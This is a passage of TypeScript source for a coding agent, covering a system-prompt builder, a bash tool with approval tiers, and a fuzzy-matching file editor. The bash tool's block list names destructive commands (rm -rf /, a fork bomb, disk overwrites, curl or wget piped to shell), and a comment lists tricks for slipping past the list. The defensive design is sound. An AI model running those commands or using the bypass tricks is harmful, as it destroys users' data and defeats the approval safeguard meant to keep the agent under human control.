import path from 'node:path';
import { getAllTools } from './tools/index.js';
import { buildSkillsCatalogSection, initializeSkillsSupport } from './skills.js';
import { getActiveRuntimeConfigPath } from './runtime-config.js';

/**
 * Load AGENTS.md content from cwd and parent directories.
 *
 * AGENTS.md (https://agents.md/) is a simple, open format for guiding coding agents.
 * It's like a README for agents — a dedicated place to give AI coding tools the
 * context they need to work on a project.
 *
 * The lookup is hierarchical:
 *  - Checks cwd, then parent directories up to the filesystem root
 *  - First AGENTS.md found wins
 *  - Returns null if no AGENTS.md is found
 */
async function loadAgentsMd(): Promise<{ content: string; path: string } | null> {
  let currentDir = path.resolve('.');

  while (true) {
    const agentsPath = path.join(currentDir, 'AGENTS.md');
    try {
      await fs.access(agentsPath);
      const content = await fs.readFile(agentsPath, 'utf-8');
      return { content, path: agentsPath };
    } catch {
      // File doesn't exist here — check parent
    }

    const parentDir = path.dirname(currentDir);
    if (parentDir === currentDir) break; // Reached filesystem root
    currentDir = parentDir;
  }

  return null;
}

/** Build a filtered directory tree (depth 3, excludes noise). */
async function buildDirectoryTree(dirPath = '.', depth = 0, maxDepth = 3): Promise<string> {
  if (depth > maxDepth) return '';

  const indent = '  '.repeat(depth);
  let tree = '';

  try {
    const fullPath = path.resolve(dirPath);
    const entries = await fs.readdir(fullPath, { withFileTypes: true });

    const filtered = entries.filter((e) => {
      const n = e.name;
      return !n.startsWith('.') && !['node_modules', 'dist', 'build', 'coverage', '__pycache__', '.git'].includes(n) && !n.endsWith('.log');
    });

    for (const entry of filtered.slice(0, 20)) {
      if (entry.isDirectory()) {
        tree += \`\${indent}\${entry.name}/\\n\`;
        tree += await buildDirectoryTree(path.join(dirPath, entry.name), depth + 1, maxDepth);
      } else {
        tree += \`\${indent}\${entry.name}\\n\`;
      }
    }

    if (filtered.length > 20) {
      tree += \`\${indent}... (\${filtered.length - 20} more)\\n\`;
    }
  } catch {
    // Can't read directory — skip
  }

  return tree;
}

/** Auto-generate tool descriptions from their JSON schemas. */
function generateToolDescriptions(): string {
  return getAllTools()
    .map((tool, i) => {
      const fn = tool.function;
      const params = fn.parameters as { required?: string[]; properties?: Record<string, any> };
      const required = params.required || [];
      const props = Object.keys(params.properties || {});
      const paramList = props
        .map((p) => \`\${p}\${required.includes(p) ? ' (required)' : ' (optional)'}\`)
        .join(', ');
      return \`\${i + 1}. \${fn.name} — \${fn.description}\\n   Parameters: \${paramList || 'none'}\`;
    })
    .join('\\n\\n');
}

/** Generate the complete system prompt. */
export async function generateSystemPrompt(): Promise<string> {
  const cwd = process.cwd();
  const projectName = path.basename(cwd);
  const tree = await buildDirectoryTree();
  const skills = await initializeSkillsSupport();
  const toolDescriptions = generateToolDescriptions();
  const skillsSection = buildSkillsCatalogSection(skills);
  const configPath = getActiveRuntimeConfigPath();
  const agentsMd = await loadAgentsMd();

  const agentsMdSection = agentsMd
    ? \`\\nAGENTS.md INSTRUCTIONS\\n\\nThe following instructions are from the AGENTS.md file at: \${agentsMd.path}\\n\\n\${agentsMd.content}\\n\`
    : '';

  return \`You are ProtoAgent, a coding assistant with file system and shell command capabilities.
Your job is to help the user complete coding tasks in their project. You must be absolutely careful and diligent in your work, and follow all guidelines to the letter. Always prefer thoroughness and correctness over speed. Never cut corners.

PROJECT CONTEXT

Working Directory: \${cwd}
Project Name: \${projectName}
Configuration Path: \${configPath || 'none (using defaults)'}

PROJECT STRUCTURE:
\${tree}
\${agentsMdSection}
PROTOAGENT DOCUMENTATION

ProtoAgent is a build-your-own coding agent — a lean, readable implementation that gives you the blueprint to understand and build your own AI coding assistant.

Configuration guide: https://protoagent.dev/guide/configuration

AVAILABLE TOOLS

\${toolDescriptions}
\${skillsSection ? \`\\n\${skillsSection}\\n\` : ''}
GUIDELINES

OUTPUT FORMAT:
- You are running in a terminal. Be concise. Optimise for scannability.
- Use **bold** and *italic* formatting tastefully to highlight key points and structure your responses.
- Do NOT use # headers, --- dividers, or other structural Markdown.
- Do NOT use Markdown code fences (backticks) unless the content is actual code or a command.
- For structured data, use plain text with aligned columns (spaces, not pipes/dashes).
- Keep tables compact: narrower columns, minimal padding. Wrap cell content rather than making very wide tables.
- Use flat plain-text lists with a simple dash or symbol prefix (e.g. - item, or ✅ done, ❌ failed).
- NEVER use nested indentation. Keep all lists flat — one level only.
- Do NOT use Markdown links [text](url) — just write URLs inline.

SUBAGENT STRATEGY:
Delegate work to specialized subagents aggressively. They excel at focused, parallel tasks.
- **When to use subagents**: Any task involving deep research, broad codebase exploration, complex analysis, or multi-step investigations.
- **Parallelizable tasks**: When a request can be split into independent subtasks, strongly prefer delegating those pieces to subagents so they can run concurrently.
- **Parallel work**: Launch multiple subagents simultaneously for independent tasks (e.g., search different parts of codebase, investigate different issues).
- **Thorough context**: Always provide subagents with complete task descriptions, relevant background, and specific success criteria. Be explicit about what "done" looks like.
- **Trust the delegation**: Subagents have access to the same tools and can work autonomously. Don't re-do their work in your main context.
- **Examples of good delegation**:
  - Complex codebase exploration → Use Explore agent with "very thorough" or "medium" setting
  - Cross-file code searches → Launch Bash agent for grep/find operations in parallel
  - Architecture/design planning → Use Plan agent to explore codebase and design approach
  - Multi-step debugging → Use general-purpose agent for systematic investigation

WORKFLOW:
- Before making tool calls, briefly explain what you're about to do and why.
- Always read files before editing them.
- Prefer edit_file over write_file for existing files.
- Use TODO tracking (todo_write / todo_read) by default for almost all work. The only exceptions are when the user explicitly asks you not to use TODOs, or when the task is truly trivial and can be completed in a single obvious step.
- Start by creating or refreshing the TODO list before doing substantive work, then keep it current throughout the task: mark items in_progress/completed as you go, and read it back whenever you need to check or communicate progress.
- When you update the TODO list, always write the full latest list so the user can see the current plan and status clearly in the tool output.
- Search first when you need to find something — use search_files or bash with grep/find, or delegate to a subagent for thorough exploration.
- Shell commands: safe commands (ls, grep, git status, etc.) run automatically. Other commands require user approval.
- **Diligence**: Don't cut corners. Verify assumptions before acting. Read related code. Test changes where possible. Leave the codebase better than you found it.

FILE OPERATIONS:
- ALWAYS use read_file before editing to get exact content.
- NEVER write over existing files unless explicitly asked — use edit_file instead.
- Create parent directories before creating files in them.
- INDENTATION: when writing new_string for edit_file, preserve the exact indentation of every line. Copy the indent character-for-character from the file. A single dropped space is a bug.
- STRICT TYPO PREVENTION: You have a tendency to drop characters or misspell words (e.g., "commands" vs "comands") when generating long code blocks. Before submitting a tool call, perform a character-by-character mental audit.
- VERIFICATION STEP: After generating a new_string, compare it against the old_string. Ensure that only the intended changes are present and that no existing words have been accidentally altered or truncated.
- NO TRUNCATION: Never truncate code or leave "..." in your tool calls. Every string must be literal and complete.
- IF edit_file FAILS: do NOT retry by guessing or reconstructing old_string from memory. Call read_file on the file first, then copy the exact text verbatim for old_string. The error output shows exactly which lines differ between your old_string and the file — read those carefully before retrying.

IMPLEMENTATION STANDARDS:
- **Thorough investigation**: Before implementing, understand the existing codebase, patterns, and related systems.
- **Completeness**: Ensure implementations are complete and tested, not partial or left in a broken state.
- **Code quality**: Follow existing code style and conventions. Make changes that fit naturally into the codebase.
- **Documentation**: Update relevant documentation and comments if the code isn't self-evident.
- **No half measures**: If a task requires 3 steps to do properly, do all 3 steps. Don't leave TODOs for later work unless explicitly scoped that way.\`;
}
`,
  },
  {
    path: "src/tools/bash.ts",
    content: `/**
 * bash tool — Execute shell commands with security controls.
 *
 * Three-tier security model:
 *  1. Hard-blocked dangerous commands (cannot be overridden)
 *  2. Auto-approved safe commands (read-only / info commands)
 *  3. Everything else requires user approval
 */

import { spawn } from 'node:child_process';
import path from 'node:path';
import { requestApproval } from '../utils/approval.js';
import { logger } from '../utils/logger.js';
import { getWorkingDirectory, validatePath } from '../utils/path-validation.js';

export const bashTool = {
  type: 'function' as const,
  function: {
    name: 'bash',
    description:
      'Execute a shell command. Safe commands (ls, grep, git status, etc.) run automatically. ' +
      'Other commands require user approval. Some dangerous commands are blocked entirely.',
    parameters: {
      type: 'object',
      properties: {
        command: { type: 'string', description: 'The shell command to execute.' },
        timeout_ms: { type: 'number', description: 'Timeout in milliseconds. Defaults to 30000 (30s).' },
      },
      required: ['command'],
    },
  },
};

// Security: Hard-blocked commands — these CANNOT be run, even with --dangerously-skip-permissions
// Naive approach: Allow any command with user approval
// Risk: Some commands are too destructive even with approval (rm -rf /, mkfs)
const DANGEROUS_PATTERNS = [
  'rm -rf /',
  'sudo',
  'su ',
  'chmod 777',
  'dd if=',
  'mkfs',
  'fdisk',
  'format c:',
  '> /dev/sda',           // Disk overwrite
  'of=/dev/sda',          // dd to disk
  ':(){ :|:& };:',        // Fork bomb
  'curl.*\\|.*sh',         // Pipe curl to shell (common exploit)
  'wget.*\\|.*sh',         // Pipe wget to shell
];

// Security: Allowlist approach for safe commands
// Naive approach: Blocklist of dangerous patterns - easily bypassed
// Bypass examples: 's\\udo', '\$(which sudo)', '/bin/rm', 'sh -c "rm -rf /"'
// Fix: Allowlist - only these specific commands run without approval
const SAFE_COMMANDS = [
  'pwd', 'whoami', 'date', 'uname', 'uptime',
  'git status', 'git log', 'git diff', 'git branch', 'git show', 'git remote -v',
  'npm list', 'npm ls', 'yarn list',
  'node --version', 'npm --version', 'python --version', 'python3 --version',
  'which', 'type',
];

// Security: Stricter shell control pattern to catch bypass attempts
// Naive approach: Simple regex misses many bypasses
// Bypasses: Newlines, encoded chars, quoted operators, backticks
const SHELL_CONTROL_PATTERN = /[;&|<>()\`\$\\[\\]{}!]/;

// Commands that read files - require path validation
const FILE_READING_COMMANDS = new Set(['cat', 'head', 'tail', 'grep', 'rg', 'find', 'awk', 'sed', 'sort', 'uniq', 'cut', 'wc', 'tree', 'file', 'dir', 'ls', 'echo']);

function isDangerous(command: string): boolean {
  const lower = command.toLowerCase().trim();
  return DANGEROUS_PATTERNS.some((p) => lower.includes(p));
}

function hasShellControlOperators(command: string): boolean {
  return SHELL_CONTROL_PATTERN.test(command);
}

function tokenizeCommand(command: string): string[] | null {
  const tokens = command.match(/"(?:\\\\.|[^"\\\\])*"|'(?:\\\\.|[^'\\\\])*'|\\S+/g);
  return tokens && tokens.length > 0 ? tokens : null;
}

function stripOuterQuotes(value: string): string {
  if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
    return value.slice(1, -1);
  }
  return value;
}

function looksLikePath(token: string): boolean {
  if (!token) return false;
  if (token === '.' || token === '..') return true;
  if (token.startsWith('/') || token.startsWith('./') || token.startsWith('../') || token.startsWith('~/')) {
    return true;
  }
  return token.includes(path.sep) || /\\.[A-Za-z0-9_-]+\$/.test(token);
}

async function validateCommandPaths(tokens: string[]): Promise<boolean> {
  for (let index = 1; index < tokens.length; index++) {
    const token = stripOuterQuotes(tokens[index]);
    if (!looksLikePath(token)) continue;
    if (token.startsWith('~')) return false;

    try {
      await validatePath(token);
    } catch {
      return false;
    }
  }

  return true;
}

async function isSafe(command: string): Promise<boolean> {
  const trimmed = command.trim();
  if (!trimmed || hasShellControlOperators(trimmed)) {
    return false;
  }

  // Security: Reject commands with newlines (bypass technique)
  if (trimmed.includes('\\n') || trimmed.includes('\\r')) {
    return false;
  }

  // Security: Reject escape sequences that could hide shell operators
  if (/\\\\[;&|<>()\`\$]/.test(trimmed)) {
    return false;
  }

  const tokens = tokenizeCommand(trimmed);
  if (!tokens) {
    return false;
  }

  const firstWord = trimmed.split(/\\s+/)[0];

  // Security: File-reading commands need path validation
  // They can read any file in working directory but not outside
  const needsPathValidation = FILE_READING_COMMANDS.has(firstWord);

  // Check against allowlist of safe commands
  const matchedSafeCommand = SAFE_COMMANDS.some((safe) => {
    if (safe.includes(' ')) {
      return trimmed === safe || trimmed.startsWith(\`\${safe} \`);
    }
    return firstWord === safe;
  });

  if (!matchedSafeCommand && !needsPathValidation) {
    return false;
  }

  // Security: Always validate paths for file-reading commands
  if (needsPathValidation) {
    return validateCommandPaths(tokens);
  }

  return true;
}

export async function runBash(
  command: string,
  timeoutMs = 30_000,
  sessionId?: string,
  abortSignal?: AbortSignal
): Promise<string> {
  // Layer 1: hard block
  if (isDangerous(command)) {
    return \`Error: Command blocked for safety. "\${command}" contains a dangerous pattern that cannot be executed.\`;
  }

  // Layer 2: safe commands skip approval
  if (!(await isSafe(command))) {
    // Layer 3: interactive approval
    const approved = await requestApproval({
      id: \`bash-\${Date.now()}\`,
      type: 'shell_command',
      description: \`Run command: \${command}\`,
      detail: \`Working directory: \${getWorkingDirectory()}\\nCommand: \${command}\`,
      sessionId,
      sessionScopeKey: \`shell:\${command}\`,
    });

    if (!approved) {
      return \`Command cancelled by user: \${command}\`;
    }
  }

  logger.debug(\`Executing: \${command}\`);

  return new Promise((resolve) => {
    let stdout = '';
    let stderr = '';
    let timedOut = false;
    let aborted = false;

    const child = spawn(command, [], {
      shell: true,
      cwd: process.cwd(),
      env: { ...process.env },
      stdio: ['pipe', 'pipe', 'pipe'],
    });

    child.stdout?.on('data', (data: Buffer) => { stdout += data.toString(); });
    child.stderr?.on('data', (data: Buffer) => { stderr += data.toString(); });

    const terminateChild = () => {
      child.kill('SIGTERM');
      setTimeout(() => child.kill('SIGKILL'), 2000);
    };

    const onAbort = () => {
      aborted = true;
      terminateChild();
    };

    if (abortSignal?.aborted) {
      onAbort();
    } else {
      abortSignal?.addEventListener('abort', onAbort, { once: true });
    }

    const timer = setTimeout(() => {
      timedOut = true;
      terminateChild();
    }, timeoutMs);

    child.on('close', (code) => {
      clearTimeout(timer);
      abortSignal?.removeEventListener('abort', onAbort);

      if (aborted) {
        resolve(\`Command aborted by user.\\nPartial stdout:\\n\${stdout.slice(0, 5000)}\\nPartial stderr:\\n\${stderr.slice(0, 2000)}\`);
        return;
      }

      if (timedOut) {
        resolve(\`Command timed out after \${timeoutMs / 1000}s.\\nPartial stdout:\\n\${stdout.slice(0, 5000)}\\nPartial stderr:\\n\${stderr.slice(0, 2000)}\`);
        return;
      }

      // Truncate very long output
      const maxLen = 50_000;
      const truncatedStdout = stdout.length > maxLen
        ? stdout.slice(0, maxLen) + \`\\n... (output truncated, \${stdout.length} chars total)\`
        : stdout;

      if (code === 0) {
        resolve(truncatedStdout || '(command completed successfully with no output)');
      } else {
        resolve(\`Command exited with code \${code}.\\nstdout:\\n\${truncatedStdout}\\nstderr:\\n\${stderr.slice(0, 5000)}\`);
      }
    });

    child.on('error', (err) => {
      clearTimeout(timer);
      abortSignal?.removeEventListener('abort', onAbort);
      resolve(\`Error executing command: \${err.message}\`);
    });
  });
}
`,
  },
  {
    path: "src/tools/edit-file.ts",
    content: `/**
 * edit_file tool — Find-and-replace in an existing file. Requires approval.
 *
 * Uses a fuzzy match cascade of 5 strategies to find the old_string,
 * tolerating minor whitespace discrepancies from the model.
 * Returns a unified diff on success so the model can verify its edit.
 */

import fs from 'node:fs/promises';
import path from 'node:path';
import { validatePath } from '../utils/path-validation.js';
import { findSimilarPaths } from '../utils/path-suggestions.js';
import { requestApproval } from '../utils/approval.js';
import { checkReadBefore, recordRead } from '../utils/file-time.js';
import { atomicWriteFile } from '../utils/atomic-write.js';

// Security: Size limits to prevent DoS via memory exhaustion
const MAX_EDIT_STRING_LENGTH = 100_000;      // 100KB for old/new strings
const MAX_EDIT_FILE_SIZE = 10_000_000;       // 10MB for target file

export const editFileTool = {
  type: 'function' as const,
  function: {
    name: 'edit_file',
    description:
      'Edit an existing file by replacing an exact string match with new content. ' +
      'The old_string must match exactly (including whitespace and indentation). ' +
      'Always read the file first to get the exact content to replace.',
    parameters: {
      type: 'object',
      properties: {
        file_path: { type: 'string', description: 'Path to the file to edit.' },
        old_string: { type: 'string', description: 'The exact text to find and replace.' },
        new_string: { type: 'string', description: 'The text to replace it with.' },
        expected_replacements: {
          type: 'number',
          description: 'Expected number of replacements (default 1). Fails if actual count differs.',
        },
      },
      required: ['file_path', 'old_string', 'new_string'],
    },
  },
};

// ─── Fuzzy Match Strategies ───

interface MatchStrategy {
  name: string;
  /** Given file content and the model's oldString, return the actual substring in content to replace, or null. */
  findMatch(content: string, oldString: string): string | null;
}

/** Strategy 1: Exact verbatim match (current behavior). */
const exactReplacer: MatchStrategy = {
  name: 'exact',
  findMatch(content, oldString) {
    return content.includes(oldString) ? oldString : null;
  },
};

/** Strategy 2: Per-line .trim() comparison — uses file's actual indentation. */
const lineTrimmedReplacer: MatchStrategy = {
  name: 'line-trimmed',
  findMatch(content, oldString) {
    const searchLines = oldString.split('\\n').map(l => l.trim());
    const contentLines = content.split('\\n');

    for (let i = 0; i <= contentLines.length - searchLines.length; i++) {
      let match = true;
      for (let j = 0; j < searchLines.length; j++) {
        if (contentLines[i + j].trim() !== searchLines[j]) {
          match = false;
          break;
        }
      }
      if (match) {
        // Return the actual lines from the file content
        return contentLines.slice(i, i + searchLines.length).join('\\n');
      }
    }
    return null;
  },
};

/** Strategy 3: Strip common leading indent from both before comparing. */
const indentFlexReplacer: MatchStrategy = {
  name: 'indent-flexible',
  findMatch(content, oldString) {
    const oldLines = oldString.split('\\n');
    const commonIndent = getCommonIndent(oldLines);
    if (commonIndent === 0) return null;

    const stripped = oldLines.map(l => l.slice(commonIndent)).join('\\n');
    const contentLines = content.split('\\n');

    for (let i = 0; i <= contentLines.length - oldLines.length; i++) {
      const fileSlice = contentLines.slice(i, i + oldLines.length);
      const fileCommonIndent = getCommonIndent(fileSlice);
      const fileStripped = fileSlice.map(l => l.slice(fileCommonIndent)).join('\\n');

      if (fileStripped === stripped) {
        return fileSlice.join('\\n');
      }
    }
    return null;
  },
};

/** Strategy 4: Collapse all whitespace runs to single space before comparing. */
const whitespaceNormReplacer: MatchStrategy = {
  name: 'whitespace-normalized',
  findMatch(content, oldString) {
    const normalize = (s: string) => s.replace(/\\s+/g, ' ').trim();
    const target = normalize(oldString);
    if (!target) return null;

    const contentLines = content.split('\\n');
    const oldLineCount = oldString.split('\\n').length;

    // Slide a window of oldLineCount lines across the file
    for (let i = 0; i <= contentLines.length - oldLineCount; i++) {
      const window = contentLines.slice(i, i + oldLineCount).join('\\n');
      if (normalize(window) === target) {
        return window;
      }
    }
    return null;
  },
};

/** Strategy 5: .trim() the entire oldString before searching. */
const trimmedBoundaryReplacer: MatchStrategy = {
  name: 'trimmed-boundary',
  findMatch(content, oldString) {
    const trimmed = oldString.trim();
    if (trimmed === oldString) return null; // no change from exact
    return content.includes(trimmed) ? trimmed : null;
  },
};

const STRATEGIES: MatchStrategy[] = [
  exactReplacer,
  lineTrimmedReplacer,
  indentFlexReplacer,
  whitespaceNormReplacer,
  trimmedBoundaryReplacer,
];

function getCommonIndent(lines: string[]): number {
  let min = Infinity;
  for (const line of lines) {
    if (line.trim().length === 0) continue; // skip blank lines
    const indent = line.length - line.trimStart().length;
    min = Math.min(min, indent);
  }
  return min === Infinity ? 0 : min;
}

/**
 * Count non-overlapping occurrences of \`needle\` in \`haystack\`.
 */
function countOccurrences(haystack: string, needle: string): number {
  let count = 0;
  let idx = 0;
  while ((idx = haystack.indexOf(needle, idx)) !== -1) {
    count++;
    idx += needle.length;
  }
  return count;
}

/**
 * Try each strategy in order. Return the actual substring to replace,
 * the strategy name used, and how many occurrences exist.
 * Only accepts strategies that find exactly one match (unambiguous).
 */
function findWithCascade(
  content: string,
  oldString: string,
  expectedReplacements: number,
): { actual: string; strategy: string; count: number } | null {
  for (const strategy of STRATEGIES) {
    const actual = strategy.findMatch(content, oldString);
    if (!actual) continue;

    const count = countOccurrences(content, actual);
    if (count === expectedReplacements) {
      return { actual, strategy: strategy.name, count };
    }
    // If count doesn't match expected, skip this strategy
  }
  return null;
}

// ─── Unified Diff ───

function computeUnifiedDiff(oldContent: string, newContent: string, filePath: string): string {
  const oldLines = oldContent.split('\\n');
  const newLines = newContent.split('\\n');

  // Find changed regions
  const hunks: Array<{ oldStart: number; oldLines: string[]; newStart: number; newLines: string[] }> = [];
  let i = 0;
  let j = 0;

  while (i < oldLines.length || j < newLines.length) {
    // Skip matching lines
    if (i < oldLines.length && j < newLines.length && oldLines[i] === newLines[j]) {
      i++;
      j++;
      continue;
    }

    // Found a difference — collect the changed region
    const oldStart = i;
    const newStart = j;
    const hunkOld: string[] = [];
    const hunkNew: string[] = [];

    // Collect differing lines
    while (i < oldLines.length && j < newLines.length && oldLines[i] !== newLines[j]) {
      hunkOld.push(oldLines[i]);
      hunkNew.push(newLines[j]);
      i++;
      j++;
    }

    // Handle remaining lines in either side
    while (i < oldLines.length && (j >= newLines.length || oldLines[i] !== newLines[j])) {
      hunkOld.push(oldLines[i]);
      i++;
    }
    while (j < newLines.length && (i >= oldLines.length || oldLines[i] !== newLines[j])) {
      hunkNew.push(newLines[j]);
      j++;
    }

    hunks.push({ oldStart, oldLines: hunkOld, newStart, newLines: hunkNew });
  }

  if (hunks.length === 0) return '';

  // Build unified diff output with 2 lines of context
  const CONTEXT = 2;
  const diffLines: string[] = [
    \`--- a/\${filePath}\`,
    \`+++ b/\${filePath}\`,
  ];

  let totalChanged = 0;
  for (const hunk of hunks) {
    totalChanged += hunk.oldLines.length + hunk.newLines.length;
    if (totalChanged > 50) {
      // Add what we have so far, then truncate
      break;
    }

    const ctxBefore = Math.max(0, hunk.oldStart - CONTEXT);
    const ctxAfterOld = Math.min(oldLines.length, hunk.oldStart + hunk.oldLines.length + CONTEXT);
    const ctxAfterNew = Math.min(newLines.length, hunk.newStart + hunk.newLines.length + CONTEXT);

    const oldHunkSize = (hunk.oldStart - ctxBefore) + hunk.oldLines.length + (ctxAfterOld - hunk.oldStart - hunk.oldLines.length);
    const newHunkSize = (hunk.newStart - ctxBefore) + hunk.newLines.length + (ctxAfterNew - hunk.newStart - hunk.newLines.length);

    diffLines.push(\`@@ -\${ctxBefore + 1},\${oldHunkSize} +\${ctxBefore + 1},\${newHunkSize} @@\`);

    // Context before
    for (let k = ctxBefore; k < hunk.oldStart; k++) {
      diffLines.push(\` \${oldLines[k]}\`);
    }

    // Removed lines
    for (const line of hunk.oldLines) {
      diffLines.push(\`-\${line}\`);
    }

    // Added lines
    for (const line of hunk.newLines) {
      diffLines.push(\`+\${line}\`);
    }

    // Context after
    for (let k = hunk.oldStart + hunk.oldLines.length; k < ctxAfterOld; k++) {
      diffLines.push(\` \${oldLines[k]}\`);
    }
  }

  if (totalChanged > 50) {
    diffLines.push('... (truncated)');
  }

  return diffLines.join('\\n');
}

// ─── Main editFile function ───

export async function editFile(
  filePath: string,
  oldString: string,
  newString: string,
  expectedReplacements = 1,
  sessionId?: string,
): Promise<string> {
  // Security: Validate size limits to prevent DoS attacks
  // Naive approach: No validation - attacker can send multi-GB strings causing OOM
  // Attack: oldString = 'A'.repeat(1e9) exhausts process memory during string comparison
  if (oldString.length === 0) {
    return 'Error: old_string cannot be empty.';
  }

  if (oldString.length > MAX_EDIT_STRING_LENGTH) {
    return \`Error: old_string too large (\${oldString.length} chars, max \${MAX_EDIT_STRING_LENGTH})\`;
  }

  if (newString.length > MAX_EDIT_STRING_LENGTH) {
    return \`Error: new_string too large (\${newString.length} chars, max \${MAX_EDIT_STRING_LENGTH})\`;
  }

  let validated: string;
  try {
    validated = await validatePath(filePath);
  } catch (err: any) {
    if (err.message?.includes('does not exist') || err.code === 'ENOENT') {
      const suggestions = await findSimilarPaths(filePath);
      let msg = \`File not found: '\${filePath}'.\`;
      if (suggestions.length > 0) {
        msg += ' Did you mean one of these?\\n' + suggestions.map(s => \`  \${s}\`).join('\\n');
      }
      return msg;
    }
    throw err;
  }

  // Staleness guard: must have read file before editing
  if (sessionId) {
    const staleError = checkReadBefore(sessionId, validated);
    if (staleError) return staleError;
  }

  const content = await fs.readFile(validated, 'utf8');

  // Security: Validate file size after reading to prevent DoS
  // Naive approach: Process any file size, causing O(n*m) memory exhaustion
  // Attack: File with 10M lines and oldString targeting all of them
  if (content.length > MAX_EDIT_FILE_SIZE) {
    return \`Error: file too large for editing (\${content.length} chars, max \${MAX_EDIT_FILE_SIZE})\`;
  }

  // Use fuzzy match cascade
  const match = findWithCascade(content, oldString, expectedReplacements);

  if (!match) {
    // Check if we found it with wrong count
    for (const strategy of STRATEGIES) {
      const actual = strategy.findMatch(content, oldString);
      if (actual) {
        const count = countOccurrences(content, actual);
        return \`Error: found \${count} occurrence(s) of old_string (via \${strategy.name} match), but expected \${expectedReplacements}. Be more specific or set expected_replacements=\${count}.\`;
      }
    }

    // Build a per-strategy diagnostic to help the model self-correct without
    // requiring a full re-read. For each strategy, find the closest partial
    // match and report ALL lines where it diverges (not just the first).
    const searchLines = oldString.split('\\n');
    const contentLines = content.split('\\n');
    const diagnostics: string[] = [];

    for (const strategy of STRATEGIES) {
      // Find the window in the file that shares the most lines with oldString
      let bestWindowStart = -1;
      let bestMatchedLines = 0;

      for (let i = 0; i <= contentLines.length - searchLines.length; i++) {
        let matched = 0;
        for (let j = 0; j < searchLines.length; j++) {
          const fileLine = strategy.name === 'whitespace-normalized'
            ? contentLines[i + j].replace(/\\s+/g, ' ').trim()
            : contentLines[i + j].trim();
          const searchLine = strategy.name === 'whitespace-normalized'
            ? searchLines[j].replace(/\\s+/g, ' ').trim()
            : searchLines[j].trim();
          if (fileLine === searchLine) matched++;
        }
        if (matched > bestMatchedLines) {
          bestMatchedLines = matched;
          bestWindowStart = i;
        }
      }

      if (bestWindowStart >= 0 && bestMatchedLines > 0 && bestMatchedLines < searchLines.length) {
        // Collect all diverging lines, not just the first
        const diffLines: string[] = [];
        const MAX_DIFFS = 6;
        for (let j = 0; j < searchLines.length && diffLines.length < MAX_DIFFS; j++) {
          const fileLine = contentLines[bestWindowStart + j] ?? '(end of file)';
          const searchLine = searchLines[j];
          const fileNorm = strategy.name === 'whitespace-normalized'
            ? fileLine.replace(/\\s+/g, ' ').trim()
            : fileLine.trim();
          const searchNorm = strategy.name === 'whitespace-normalized'
            ? searchLine.replace(/\\s+/g, ' ').trim()
            : searchLine.trim();
          if (fileNorm !== searchNorm) {
            diffLines.push(
              \`    line \${bestWindowStart + j + 1}:\\n\` +
              \`      yours: \${searchLine.trim().slice(0, 120)}\\n\` +
              \`      file:  \${fileLine.trim().slice(0, 120)}\`
            );
          }
        }
        const truncNote = diffLines.length === MAX_DIFFS ? \`\\n    ... (more diffs not shown)\` : '';
        diagnostics.push(
          \`  \${strategy.name}: \${bestMatchedLines}/\${searchLines.length} lines match, \${searchLines.length - bestMatchedLines} differ:\\n\` +
          diffLines.join('\\n') + truncNote
        );
      } else if (bestMatchedLines === 0) {
        diagnostics.push(\`  \${strategy.name}: no lines matched — old_string may be from a different file or heavily rewritten\`);
      } else {
        diagnostics.push(\`  \${strategy.name}: no partial match found\`);
      }
    }

    const hint = diagnostics.length > 0
      ? '\\nDiagnostics per strategy:\\n' + diagnostics.join('\\n')
      : '';
    return \`Error: old_string not found in \${filePath}.\${hint}\\nDo NOT retry with a guess. Call read_file on \${filePath} first to get the exact current content, then construct old_string by copying verbatim from the file.\`;
  }

  const { actual, strategy, count } = match;

  // Request approval
  const oldPreview = oldString.length > 200 ? oldString.slice(0, 200) + '...' : oldString;
  const newPreview = newString.length > 200 ? newString.slice(0, 200) + '...' : newString;
  const strategyNote = strategy !== 'exact' ? \` [matched via \${strategy}]\` : '';

  const approved = await requestApproval({
    id: \`edit-\${Date.now()}\`,
    type: 'file_edit',
    description: \`Edit file: \${filePath} (\${count} replacement\${count > 1 ? 's' : ''})\${strategyNote}\`,
    detail: \`Replace:\\n\${oldPreview}\\n\\nWith:\\n\${newPreview}\`,
    sessionId,
    sessionScopeKey: \`file_edit:\${validated}\`,
  });

  if (!approved) {
    return \`Operation cancelled: edit to \${filePath} was rejected by user.\`;
  }

  // Perform replacement using the actual matched string (not the model's version)
  const newContent = content.split(actual).join(newString);

  // Security: Use atomic write utility with O_CREAT|O_EXCL protection
  const result = await atomicWriteFile(validated, newContent);
  if (!result.success) {
    return \`Error writing file: \${result.error}\`;
  }

  // Re-read file after write (captures any formatter changes)
  // Also record the read so subsequent edits don't fail the mtime check
  const finalContent = await fs.readFile(validated, 'utf8');
  if (sessionId) {
    recordRead(sessionId, validated);
  }

  // Compute and return unified diff
  const diff = computeUnifiedDiff(content, finalContent, filePath);
  const header = \`Successfully edited \${filePath}: \${count} replacement(s) made.\`;

  if (diff) {
    return \`\${header}\\n\${diff}\`;
  }
  return header;
}
`,
  },
  {
    path: "src/tools/index.ts",
    content: `/**
 * Tool registry — collects all tool definitions and provides a dispatcher.
 *
 * Each tool file exports:
 *  - A tool definition (OpenAI function-calling JSON schema)
 *  - A handler function (args) => Promise<string>
 *
 * This file wires them together into a single \`tools\` array and
 * a \`handleToolCall(name, args)\` dispatcher.
 */

import { readFileTool, readFile } from './read-file.js';
import { writeFileTool, writeFile } from './write-file.js';
import { editFileTool, editFile } from './edit-file.js';
import { listDirectoryTool, listDirectory } from './list-directory.js';
import { searchFilesTool, searchFiles } from './search-files.js';
import { bashTool, runBash } from './bash.js';
import { todoReadTool, todoWriteTool, readTodos, writeTodos } from './todo.js';
import { webfetchTool, webfetch } from './webfetch.js';

export { setDangerouslySkipPermissions, setApprovalHandler, clearApprovalHandler } from '../utils/approval.js';

export interface ToolCallContext {
  sessionId?: string;
  abortSignal?: AbortSignal;
}

// All tool definitions — passed to the LLM
export const tools = [
  readFileTool,
  writeFileTool,
  editFileTool,
  listDirectoryTool,
  searchFilesTool,
  bashTool,
  todoReadTool,
  todoWriteTool,
  webfetchTool,
];

export type DynamicTool = {
  type: 'function';
  function: {
    name: string;
    description: string;
    parameters: Record<string, unknown>;
  };
};

// Mutable tools list — MCP and sub-agent tools get appended at runtime
let dynamicTools: DynamicTool[] = [];

export function registerDynamicTool(tool: DynamicTool): void {
  const toolName = tool.function.name;
  dynamicTools = dynamicTools.filter((existing) => existing.function.name !== toolName);
  dynamicTools.push(tool);
}

export function unregisterDynamicTool(toolName: string): void {
